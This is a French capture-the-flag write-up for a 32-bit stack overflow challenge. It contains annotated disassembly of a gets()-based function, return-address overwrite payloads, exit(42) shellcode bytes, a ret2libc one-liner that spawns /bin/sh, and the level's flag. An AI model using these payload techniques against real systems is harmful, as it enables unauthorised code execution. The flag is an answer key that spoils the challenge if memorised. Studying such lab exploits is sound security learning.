080484d4 <p>:
 80484d4:	55                   	push   ebp
 80484d5:	89 e5                	mov    ebp,esp
 80484d7:	83 ec 68             	sub    esp,0x68 ; 104
 80484da:	a1 60 98 04 08       	mov    eax,ds:0x8049860 ; une fonction (stdout@@GLIBC_2.0)
 80484df:	89 04 24             	mov    DWORD PTR [esp],eax
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt> ; fflush(stdout)
 80484e7:	8d 45 b4             	lea    eax,[ebp-0x4c] ; On prend un pointeur sur la stack stack - 76
 80484ea:	89 04 24             	mov    DWORD PTR [esp],eax
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt> ; on rempli du coup le pointeur vers les 76B.
 80484f2:	8b 45 04             	mov    eax,DWORD PTR [ebp+0x4] ; 80 à 84e char de notre buffer.
 80484f5:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax ; mov l'adresse dans ebp-12
 80484f8:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80484fb:	25 00 00 00 b0       	and    eax,0xb0000000
 8048500:	3d 00 00 00 b0       	cmp    eax,0xb0000000 ; eax & 0xb0000000 == 0xb0000000
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    eax,0x8048620   ; (%p)\n (objdump -s) -- donne le ptr stocké à partir ebp+0x4.
 804850c:	8b 55 f4             	mov    edx,DWORD PTR [ebp-0xc] ; prend l'adresse stocké grâce au buffer overflow
 804850f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx ; l'envoie en tant que premier argument variadique de printf
 8048513:	89 04 24             	mov    DWORD PTR [esp],eax ; puis move eax dans la stack pour être utilisé en format de printf.
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	mov    DWORD PTR [esp],0x1
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt> ; exit 1
 8048527:	8d 45 b4             	lea    eax,[ebp-0x4c]
 804852a:	89 04 24             	mov    DWORD PTR [esp],eax
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt> ; puts la clé (qui est notre stdin) ?
 8048532:	8d 45 b4             	lea    eax,[ebp-0x4c]
 8048535:	89 04 24             	mov    DWORD PTR [esp],eax
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave
 804853e:	c3                   	ret


0804853f <main>:
 804853f:	55                   	push   ebp
 8048540:	89 e5                	mov    ebp,esp
 8048542:	83 e4 f0             	and    esp,0xfffffff0
 8048545:	e8 8a ff ff ff       	call   80484d4 <p>
 804854a:	c9                   	leave  
 804854b:	c3                   	ret    
 804854c:	90                   	nop
 804854d:	90                   	nop
 804854e:	90                   	nop
 804854f:	90                   	nop


La difficulté ici, est d'écrire des codes d'opérations à exécuter (donc injecter du code), dans la mémoire chargée de l'ordinateur, et remplacer la valeur de retour par le pointeur sur ce code.
Mais, on a une sécurité à bypass. C'est le fameux `eax & 0xb0000000 == 0xb0000000`. On est quasiment sûr que notre exploit sera contenu à cet adresse.

C'est super, mais on a quand même un gros indice avec le fait d'avoir deux fonctions. Je pense que l'adresse `ret` à attaquer, c'est celle du `main`. On laisse la valeur de `ret` de la fonction `p` tranquille, et on fait pointer celle de `main` sur nos instructions.

D'après mes calculs, l'adresse de retour de main est à la position `40` de notre buffer. Il suffirait donc de :
1. Créer un buffer de 40 caractères.
2. Définir à la position 40 l'adresse de la position 44
3. Mettre nos opcodes.
4. Voir ce qu'il se passe.

Je vais essayer d'exécuter la fonction `p` :
`0x080484d4` => `\xd4\x84\x04\x08`

Injection :
`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xd4\x84\x04\x08`

Et paf! Ça fonctionne ! Du coup, ne perdons plus une seule seconde, faut tester le PoC avec un script qui fait `exit(42)`.

```s
global _start

section .text
_start:
	xor eax, eax
	mov al, 42
	mov ebx, 0h
	int 80h
```

```sh
nasm -f elf32 level2.s
ld -melf_i386 level2.o -o level2.out
```

Donne après la compilation et le linker le binaire suivant :
```
08049000 <_start>:
 8049000:       31 c0                   xor    %eax,%eax
 8049002:       b0 2a                   mov    $0x2a,%al
 8049004:       31 db                   xor    %ebx,%ebx
 8049006:       cd 80                   int    $0x80
```

On doit donc injecter les instructions suivantes juste après l'adresse :
`\x31\xc0\xb0\x2a\x31\xdb\xcd\x80`

Notre injection sera donc :
0xbfff
`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x40\xf7\xff\xbf\x31\xc0\xb0\x2a\x31\xdb\xcd\x80`

NOP:

https://shell-storm.org/shellcode/index.html
1. On overflow.
2. On essaie d'override des instructions avec un shellcode `execve("/bin/sh")`.


String `/bin/sh` présente dans la libc.so a l'offset `0x160c58` (`objdump -s`)
```
info proc map # Get the start address
(gdb) x/s 0xb7e2c000+0x160c58
0xb7f8cc58:	 "/bin/sh"

```
`python -c 'print("A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x90\x90\x90\x90" + "\x58\xcc\xf8\xb7")'`

Flag: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`